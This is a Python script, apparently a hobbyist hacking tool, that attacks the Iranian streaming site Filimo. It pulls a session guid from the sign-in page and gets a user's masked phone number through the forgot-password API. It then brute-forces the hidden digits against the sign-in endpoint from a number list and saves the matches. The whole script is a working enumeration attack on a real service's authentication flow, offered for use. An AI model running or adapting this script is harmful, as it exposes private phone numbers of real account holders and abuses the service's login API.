import requests
import bs4
from colorama import Fore
guid = ""
tempid = ""
print(Fore.GREEN+"""


  ______ _ _ _                                         _               
 |  ____(_) (_)                                       | |              
 | |__   _| |_ _ __ ___   ___    _ __  _   _ _ __ ___ | |__   ___ _ __ 
 |  __| | | | | '_ ` _ \ / _ \  | '_ \| | | | '_ ` _ \| '_ \ / _ \ '__|
 | |    | | | | | | | | | (_) | | | | | |_| | | | | | | |_) |  __/ |   
 |_|    |_|_|_|_| |_| |_|\___/  |_| |_|\__,_|_| |_| |_|_.__/ \___|_|   
                                                                       
__________________________

*channel telegram =>@termux_learning
*my rubika channel =>https://rubika.ir/No_security
*Folow my github:)
__________________________
""")
def reguid() :
    global guid
    global tempid
    mainhtml = requests.get("https://www.filimo.com/signin")
    bs1 = bs4.BeautifulSoup(mainhtml.text,"html.parser")
    bs2 = bs1.find_all("script")
    guid = str(bs2[2]).split()[5].replace('"',"").replace(",","")
    tempid = requests.post("https://www.filimo.com/api/fa/v1/user/Authenticate/auth",data={"guid":guid}).json()['data']['attributes']['temp_id']

reguid()

phone1 = ""
phone2 = ""

username = input("Username"+Fore.RED+" > ")

def getphonenum() :
    global phone1
    global phone2
    accountphone = requests.post("https://www.filimo.com/api/fa/v1/user/Authenticate/forget_pass_information",data={"account":username,"temp_id":tempid,"guid":guid}).json()['data']['attributes']['accountTypes']['mobile']
    phone0 = "0"+str(accountphone).replace("98","")
    phone1 = phone0.split("*****")[0]
    phone2 = phone0.split("*****")[1]
    print(Fore.CYAN+phone1+"***"+phone2)
getphonenum()

numbers = open("numbers.txt","w")

numberlist = open("num.txt").read().split()

for nm in numberlist:
    phonehas = requests.post("https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1",data={"account":phone1+nm+phone2,"temp_id":tempid,"guid":guid})
    if phonehas.status_code==200 :
        print(Fore.GREEN+"[your phone]:"+phone1+nm+phone2)
        numbers.write(phone1+nm+phone2+"\n")
        reguid()
    else :
        print(Fore.RED+"Not found")
